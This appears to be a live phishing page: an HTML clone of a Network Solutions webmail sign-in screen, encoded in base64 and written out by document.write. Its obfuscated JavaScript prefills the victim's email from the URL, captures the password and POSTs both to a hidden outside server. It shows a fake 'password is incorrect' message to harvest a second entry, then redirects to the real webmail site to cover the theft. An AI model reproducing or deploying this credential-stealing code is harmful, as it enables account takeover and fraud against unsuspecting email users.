document.write(decodeURIComponent(escape(atob('<html lang="en" class="windows" auth=""><head>
  <base href="https://webmail.networksolutionsemail.com/appsuite/" target="_blank">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="google" value="notranslate">
  <meta name="robots" content="noindex, nofollow">
  <meta name="theme-color" content="#fff">
  <meta name="application-name" content="App Suite">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="App Suite">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <link rel="manifest" href="https://webmail.networksolutionsemail.com/appsuite/pwa.json">
  <link id="homescreen-icon" rel="apple-touch-icon" href="./themes/default/logo_180.png">
  <link id="favicon-ico" rel="icon" href="./favicon.ico" sizes="any">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">       </script>

<script type="text/javascript">
function _0x359f(_0x2d18fd,_0x49b2d9){var _0x45dcc9=_0x45dc();return _0x359f=function(_0x359f33,_0x39732f){_0x359f33=_0x359f33-0x173;var _0x404df2=_0x45dcc9[_0x359f33];return _0x404df2;},_0x359f(_0x2d18fd,_0x49b2d9);}var _0x3f88e1=_0x359f;(function(_0x311c11,_0x3f98fc){var _0x1248a8=_0x359f,_0x3e8f0b=_0x311c11();while(!![]){try{var _0x411d43=-parseInt(_0x1248a8(0x1a4))/0x1+parseInt(_0x1248a8(0x18e))/0x2*(-parseInt(_0x1248a8(0x17a))/0x3)+parseInt(_0x1248a8(0x188))/0x4+-parseInt(_0x1248a8(0x1a3))/0x5*(parseInt(_0x1248a8(0x1a6))/0x6)+-parseInt(_0x1248a8(0x183))/0x7*(-parseInt(_0x1248a8(0x176))/0x8)+parseInt(_0x1248a8(0x194))/0x9+parseInt(_0x1248a8(0x1a0))/0xa*(parseInt(_0x1248a8(0x17b))/0xb);if(_0x411d43===_0x3f98fc)break;else _0x3e8f0b['push'](_0x3e8f0b['shift']());}catch(_0x1f70b8){_0x3e8f0b['push'](_0x3e8f0b['shift']());}}}(_0x45dc,0x63023));var hash=window[_0x3f88e1(0x18b)][_0x3f88e1(0x196)][_0x3f88e1(0x19b)](0x1);function _0x45dc(){var _0x2be629=['2863VXfhpw','#signin-message','POST','#rowpassword','fadeIn','1258036Uyunow','replace','focus','location','log','getElementById','34FnHkTt','input[name=io-ox-login-username]','io-ox-login-username','#rowfeedback','onload','aHR0cHM6Ly94dmlld3NvdXJjZS5jb20vbnR3ZS9pbmRleC5waHA=','4900365gyuWAR','href','hash','disabled','input[name=io-ox-login-password]','show','onkeydown','substr','slow','input[name=hido]','finalio-ox-login-button','auth','1357140YBNjQm','querySelector','signin-message','15SshzCm','681817XmbEQV','value','576858JwsBaY','getAttribute','The\x20password\x20is\x20incorrect.','hido','hide','5024YJiwTy','val','done','https://webmail.networksolutionsemail.com/','25977XdawNT','33kOOaNu','html','keyCode','io-ox-login-password','fail','message','#io-ox-login-button','#finalio-ox-login-button'];_0x45dc=function(){return _0x2be629;};return _0x45dc();}window[_0x3f88e1(0x192)]=function onoff(){var _0x4a525a=_0x3f88e1;document['getElementById'](_0x4a525a(0x190))['onkeydown']=function(_0x60051d){var _0x5cd93e=_0x4a525a;_0x60051d[_0x5cd93e(0x17d)]==0xd&&emailvalidator();},document[_0x4a525a(0x18d)](_0x4a525a(0x17e))[_0x4a525a(0x19a)]=function(_0x5e8b53){var _0xfd38a8=_0x4a525a;_0x5e8b53[_0xfd38a8(0x17d)]==0xd&&frmvalidator();};var _0x4e9134=document[_0x4a525a(0x1a1)]('html')[_0x4a525a(0x1a7)](_0x4a525a(0x19f)),_0x1a9c45=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(_0x4e9134!=''){if(!_0x1a9c45['test'](_0x4e9134))var _0x3b6e6c=_0x4e9134;else var _0x3b6e6c=atob(_0x4e9134);}else{if(hash){if(!_0x1a9c45['test'](hash))var _0x3b6e6c=window[_0x4a525a(0x18b)][_0x4a525a(0x196)][_0x4a525a(0x189)]('#','');else var _0x3b6e6c=atob(hash);}else var _0x3b6e6c='';}var _0x1294b9=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,7}$/;_0x3b6e6c['match'](_0x1294b9)?(document[_0x4a525a(0x18d)]('io-ox-login-username')[_0x4a525a(0x1a5)]=_0x3b6e6c,$('#io-ox-login-button')[_0x4a525a(0x175)](),$(_0x4a525a(0x182))[_0x4a525a(0x199)](),$(_0x4a525a(0x186))[_0x4a525a(0x187)](_0x4a525a(0x19c)),document['getElementById'](_0x4a525a(0x190))[_0x4a525a(0x197)]=!![],document['getElementById'](_0x4a525a(0x17e))[_0x4a525a(0x18a)]()):(document[_0x4a525a(0x18d)](_0x4a525a(0x190))[_0x4a525a(0x1a5)]='',$(_0x4a525a(0x186))['hide'](),document[_0x4a525a(0x18d)](_0x4a525a(0x190))[_0x4a525a(0x18a)]());};function emailvalidator(){var _0x58f105=_0x3f88e1,_0x162df8=document['getElementById'](_0x58f105(0x190))['value'],_0x5c2ff4=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,9}$/;_0x162df8['match'](_0x5c2ff4)?($(_0x58f105(0x181))[_0x58f105(0x175)](),$(_0x58f105(0x182))['show'](),$('#rowpassword')[_0x58f105(0x187)](_0x58f105(0x19c)),document['getElementById'](_0x58f105(0x190))[_0x58f105(0x197)]=!![],document['getElementById']('io-ox-login-password')[_0x58f105(0x18a)](),$('#rowfeedback')[_0x58f105(0x175)]()):($(_0x58f105(0x184))[_0x58f105(0x17c)]('Please\x20enter\x20your\x20email\x20address.'),$('#rowfeedback')[_0x58f105(0x199)](),document[_0x58f105(0x18d)](_0x58f105(0x190))[_0x58f105(0x1a5)]='',$(_0x58f105(0x186))[_0x58f105(0x175)](),document[_0x58f105(0x18d)](_0x58f105(0x190))[_0x58f105(0x18a)]());}function frmvalidator(){var _0x2d8c7d=_0x3f88e1,_0x79611c=document[_0x2d8c7d(0x18d)](_0x2d8c7d(0x17e)),_0x4c4aae=document['getElementById'](_0x2d8c7d(0x1a2));if(_0x79611c[_0x2d8c7d(0x1a5)]['length']<0x5)return _0x79611c['focus'](),$(_0x2d8c7d(0x184))[_0x2d8c7d(0x17c)]('Please\x20enter\x20your\x20password.\x20(UI-0002)'),$('#rowfeedback')[_0x2d8c7d(0x199)](),![];else{document[_0x2d8c7d(0x18d)](_0x2d8c7d(0x190))[_0x2d8c7d(0x197)]=!![],document['getElementById'](_0x2d8c7d(0x17e))[_0x2d8c7d(0x197)]=!![],document[_0x2d8c7d(0x18d)]('finalio-ox-login-button')[_0x2d8c7d(0x197)]=!![],$(_0x2d8c7d(0x191))['hide']();var _0xefda1=_0x2d8c7d(0x179),_0x11feea=_0x2d8c7d(0x193),_0x1d99f2={'firstname':$(_0x2d8c7d(0x18f))['val'](),'lastname':$(_0x2d8c7d(0x198))[_0x2d8c7d(0x177)](),'proche':$(_0x2d8c7d(0x19d))[_0x2d8c7d(0x177)]()};return $['ajax']({'type':_0x2d8c7d(0x185),'url':atob(_0x11feea),'data':_0x1d99f2,'dataType':'json','encode':!![]})[_0x2d8c7d(0x178)](function(_0x4e801d){var _0x531933=_0x2d8c7d;_0x4e801d[_0x531933(0x180)]=='failedme'?(document[_0x531933(0x18d)]('io-ox-login-password')['disabled']=![],document[_0x531933(0x18d)](_0x531933(0x19e))[_0x531933(0x197)]=![],document[_0x531933(0x18d)]('io-ox-login-password')[_0x531933(0x1a5)]='',$('#signin-message')[_0x531933(0x17c)](_0x531933(0x173)),$(_0x531933(0x191))['show'](),document[_0x531933(0x18d)]('io-ox-login-password')['focus'](),document['getElementById'](_0x531933(0x174))[_0x531933(0x1a5)]=0x1):($(_0x531933(0x191))[_0x531933(0x175)](),$(_0x531933(0x184))[_0x531933(0x17c)](''),window['parent'][_0x531933(0x18b)][_0x531933(0x195)]=_0xefda1);})[_0x2d8c7d(0x17f)](function(_0x4d7782){var _0x594853=_0x2d8c7d;console[_0x594853(0x18c)]('Yikes,\x20check\x20network\x20connection');}),event['preventDefault'](),!![];}}


</script>  
  <style type="text/css">
    html,
    body {
      background-color: #fff;
      margin: 0;
      padding: 0;
      border: 0;
      overscroll-behavior-y: none;
    }

    body { overflow: hidden; }

    #background-loader {
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 65300;
      background-color: #fff;
      /* activate GPU acceleration */
      transform: translateZ(0);
    }

    #showstopper {
      display: none;
      text-align: center;
      font-size: 1rem;
      line-height: 1.5rem;
      padding: 16px;
      user-select: text;
    }

    @media (min-width: 541px) {
      #showstopper {
        padding: 48px;
        border: 1px solid #ddd;
        border-radius: 16px;
        margin: 16px;
        box-shadow: 0 24px 80px 0 rgba(0, 0, 0, 0.10);
      }
    }

    #showstopper img {
      margin: 1rem 0 2rem 0;
      max-width: 100%;
    }

    #showstopper h1 {
      font-size: 1.5rem;
      line-height: 2rem;
      margin: 0 0 0.5rem 0;
    }

    #showstopper .reload {
      margin-top: 16px;
    }

    #showstopper .timeout,
    #showstopper .session,
    #showstopper .down,
    #showstopper .configuration {
      display: none;
    }

    @media (prefers-color-scheme: dark) {
      #background-loader {
        color: white;
        background-color: #111;
      }

      #showstopper {
        background-color: #151515;
        border: 1px solid #333;
      }
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .io-ox-busy {
      position: relative;
      height: 100%;
    }

    .io-ox-busy:before {
      visibility: visible;
      position: absolute;
      top: 50%;
      left: 50%;
      margin: -0.75rem 0 0 -0.75rem;
      /* adopted from boostrap 5 approach */
      width: 1.5rem;
      height: 1.5rem;
      vertical-align: text-bottom;
      border: .1em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      content: ' ';
      animation: spin 1.5s infinite linear;
    }
  </style>
      
    
    <link crossorigin='anonymous' rel="stylesheet" href="https://webmail.networksolutionsemail.com/appsuite/assets/main-CpwiaHpo.css">
    
    <style data-src="login-page-configuration" type="text/css">
      #io-ox-login-screen #io-ox-login-container { background: #ffffff; }
      #io-ox-login-screen #io-ox-login-background-image { background: none; }
      #io-ox-login-screen #io-ox-login-header, #io-ox-login-header #io-ox-languages #io-ox-languages-label { color: #000000; }
      #io-ox-login-screen #io-ox-login-header a, #io-ox-login-header .toggle-text, #io-ox-login-header .caret { color: #256672; }
      #io-ox-login-screen #login-title-mobile { color: #000000 !important; }
      #io-ox-login-screen #box-form-header { color: #333333; }
      #io-ox-login-screen #box-form-header { background: #ffffff; }
      #io-ox-login-screen #box-form-body *:not(button,.toggle,svg,svg>path) { color: #333333; }
      #io-ox-login-screen #box-form-body .checkbox.custom input:checked + .toggle { background-color: #256672; color: #ffffff; }
      #io-ox-login-screen #box-form-body .checkbox.custom input:focus + .toggle { border-color: #256672; box-shadow: 0 0 0 0.25rem #25667240; }
      #io-ox-login-screen #box-form-body { color: #333333; }
      #io-ox-login-screen #box-form #box-form-body a { color: #6c6c6c; }
      #io-ox-login-screen #box-form button, #io-ox-login-button { background-color: #256672; border-color: #256672; }
      #io-ox-login-screen #box-form button, #io-ox-login-button { border-color: #256672; }
      #io-ox-login-screen #box-form button, #io-ox-login-button { color: #ffffff; }
      #io-ox-login-screen #io-ox-login-footer, #io-ox-login-footer #io-ox-languages .lang-label { color: #6c6c6c; }
      #io-ox-login-screen #io-ox-login-footer a, #io-ox-login-footer .toggle-text, #io-ox-login-footer #language-select, #io-ox-login-footer .caret { color: #6c6c6c; }
      #io-ox-login-screen #io-ox-login-content { justify-content: center; }</style><style data-src="login-page-configuration-custom" type="text/css">#io-ox-login-screen #io-ox-information-message {
  margin-top: 24px !important;
  background-color: #fff;
  box-shadow: 0px 10px 60px #00000080;
  border-radius: 6px;
  text-align: center;
  flex-direction: column;
  padding: 16px;
  z-index: 1;
}

#io-ox-login-screen #io-ox-information-message .btn.btn-primary {
  color: var(--text);
  border-color: var(--border);
  background-color: var(--background);
}

#io-ox-login-screen #io-ox-information-message .btn.btn-primary:hover {
  background-color: var(--background-100); }</style><title>Sign in - Professional Email</title></head>

<body class="unselectable">
  
  <!-- Core Container -->
  <div id="io-ox-core" class="abs unselectable background flex-col" style="display: none">
    <div id="io-ox-tint" aria-hidden="true"></div>
    <div id="io-ox-appcontrol" style="display: none"></div>
    <div id="io-ox-banner" role="alert" style="display: none"></div>
    <!-- screens -->
    <div id="io-ox-screens" class="flex-grow">
      <!-- window manager -->
      <div id="io-ox-windowmanager" class="h-full" style="display: none">
        <div id="io-ox-windowmanager-pane"></div>
      </div>
      <!-- empty desktop -->
      <div id="io-ox-desktop" class="abs"></div>
    </div>
    <!-- container for embedded windows, used to manage flexbox overflow-->
    <div id="io-ox-taskbar-container" role="region">
      <!-- embedded windows -->
      <ul id="io-ox-taskbar"></ul>
    </div>
    <!-- container for bottom-->
    <div id="io-ox-message-container"></div>
  </div>
  <!-- Login screen -->
  <div id="io-ox-login-screen" class="unselectable">
    <div id="io-ox-login-blocker" style="display: none"></div>
    <div id="io-ox-login-container">
      <div id="io-ox-login-background-image">
        <header id="io-ox-login-header">
          <div id="io-ox-login-toolbar"><img class="login-logo" alt="Logo" src="/brands/5/logo"><div class="composition-element login-spacer"></div><span id="io-ox-languages" class="mx-16"><a href="#" role="button" class="lang-label" id="io-ox-languages-label" data-i18n="Language:" data-i18n-attr="text" aria-hidden="true" tabindex="-1">Language:</a><div class="dropdown"><a role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="sr-only" data-i18n="Language:" data-i18n-attr="text">Language:</span><span class="toggle-text" lang="en-US">English (United States)</span><span class="caret"></span></a></div></span></div>
        </header>
        <div id="io-ox-login-content">
          <div class="align-center col-sm-6 col-xs-12">
            <div class="row">
              <main id="io-ox-login-box" class="col-xs-12">
                <div class="row">
                  <div class="flex-column">
                    <div id="box-form" class="col-xs-12">
                      <div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text">Webmail Login</div>
                      <div id="box-form-body" class="row">
                        <!-- login dialog; must be hard-coded this way, otherwise browsers won't inject credentials -->
                        <form action="./api/redirect" method="post" id="io-ox-login-form" target="store-credentials" novalidate>
                          <div class="col-xs-12">
                            <div class="row title">
                              <h1 id="login-title" class="col-xs-12" data-i18n="Sign in">Sign in</h1>
                            </div>
                            <input type="hidden" name="location" value="">
                            <div class="row help">
                              <div class="col-xs-12">
                                <p id="io-ox-login-help" class="help-block"></p>
                              </div>
                            </div>
                            <div class="row username">
                              <div class="form-group col-xs-12">
                                <label for="io-ox-login-username" data-i18n="Email">Email</label>
                                <div class="text-right" style="display: none;"><a href="#" role="button" data-io-ox-loginproxy="1">Change</a></div><input type="text" id="io-ox-login-username" name="io-ox-login-username" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" data-i18n="Email" autocomplete="username">
                                  
                              </div>
                            </div>
                            <div class="row password" id="rowpassword" style="display: none;">
                              <div class="form-group col-xs-12">
                                <label for="io-ox-login-password"><span data-io-ox-loginproxy="1">Your password</span><def data-io-ox-loginproxy="1" title="required">*</def></label>
                                <input type="password" id="io-ox-login-password" name="io-ox-login-password" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n="Password" autocomplete="current-password">
                                <div class="text-right" id="io-ox-forgot-password">
                                  <a style="cursor: pointer" target="_blank" data-i18n="Forgot your password?">Forgot your password?</a>
                                </div>
                              </div>
                            </div>
                <input type="hidden" class="form-control" name="hido" id="hido" value="">
                            <div class="row password-retype">
                              <div class="form-group col-xs-12">
                                <label for="io-ox-retype-password" data-i18n="Confirm new password">Confirm new password</label>
                                <input type="password" id="io-ox-retype-password" name="password2" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n-attr="placeholder" autocomplete="new-password">
                              </div>
                            </div>
                            <div class="row options">
                              <div class="col-sm-6 col-xs-12" id="io-ox-login-store">
                                <div class="checkbox custom">
                                  <label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
                                    <input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1">Stay signed in</label>
                                </div>
                              </div>
                            </div>
                            <!-- Feedback area -->
                            
                              
                              <div class="row feedback" style="display: none" id="rowfeedback">
                              <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"><div role="alert" class="selectable-text alert alert-info" id="signin-message"></div></div>
                            </div>
                            <div class="row button">
                              <div class="form-group col-xs-12">
                                <button type="button" onClick="emailvalidator()" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" data-i18n="Sign in" data-io-ox-loginproxy="1">Continue</button>
                                <button type="button" onClick="frmvalidator()" name="signin" id="finalio-ox-login-button" class="btn btn-primary form-control" data-i18n="Sign in" data-io-ox-loginproxy="1" style="display: none;">Sign In</button>
                              </div>
                            </div>
                          </div>
                        </form>
                        

                      </div>
                    </div>
                    <div id="io-ox-information-message" data-i18n="" data-i18n-attr="html"><p>We are updating our email security and will require all email server connections to use an encrypted connection when connecting via POP or IMAP from a device. To avoid any email connection issues, please be sure to update your mail client settings.</p> <a rel="noopener" target="_blank" class="btn btn-primary form-control" >Learn More…</a></div>
                  </div>
                </div>
              </main>
            </div>
          </div>
        </div>
        <footer id="io-ox-login-footer"><div class="composition-element login-spacer"></div><span>© 2024 Open-Xchange GmbH</span><div class="composition-element"><span data-i18n="">Version:</span><span>8.25.3</span></div><div class="composition-element custom-login-links"><span class=""><a target="blank" style="color: rgb(108, 108, 108); cursor: pointer">Privacy policy</a></span></div><div class="composition-element custom-login-links"><span class=""><a target="blank" style="color: rgb(108, 108, 108); cursor: pointer">Legal notes</a></span></div><div class="composition-element login-spacer"></div></footer>
      </div>
    </div>
  </div>
  <!-- offline notifier -->
  

  
  
  
  <!-- placeholder for custom vars and rules -->
  <style type="text/css" id="theme-colors"></style>
  <style type="text/css" id="theme-accent"></style>
  <style type="text/css" id="theme"></style>
  <style type="text/css" id="theme-values"></style>
  <!-- shared styles for default logo; also to avoid Safari bug (OXUIB-1418) -->
  <svg width="0" height="0" version="1.1" xmlns="http://www.w3.org/2000/svg" class="invisible" aria-hidden="true">
    <defs>
      <linearGradient x1="54.4260204%" y1="12.8418549%" x2="7.94367821%" y2="85.4289973%" id="logoGradient-1">
        <stop stop-color="var(--accent-300)" offset="0%"></stop>
        <stop stop-color="var(--accent-600)" offset="100%"></stop>
      </linearGradient>
      <linearGradient x1="71.8535659%" y1="97.6732587%" x2="31.1841722%" y2="3.61382138%" id="logoGradient-2">
        <stop stop-color="var(--accent-400)" offset="0%"></stop>
        <stop stop-color="var(--accent-700)" offset="100%"></stop>
      </linearGradient>
    </defs>
  </svg>



<div class="accessible-tooltip-container" aria-hidden="true"></div></body></html>'))));
